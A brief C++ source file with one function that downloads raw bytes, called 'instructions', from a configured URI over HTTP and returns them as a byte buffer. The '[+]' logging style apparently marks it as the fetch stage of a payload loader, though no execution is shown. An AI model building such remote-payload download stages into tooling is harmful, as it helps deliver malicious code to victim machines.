#include "vars.cpp"
#include <cpr/cpr.h>
#include <iostream>

std::vector<unsigned char> fetch_instructions() {
  cpr::Response r = cpr::Get(cpr::Url{INSTRUCTIONS_URI});

  if (r.status_code != 200) {
    throw std::runtime_error("HTTP fetch failed with code " +
                             std::to_string(r.status_code));
  }

  std::cout << "[+] Fetched " << r.text.size() << " bytes\n";

  return std::vector<unsigned char>(r.text.begin(), r.text.end());
}
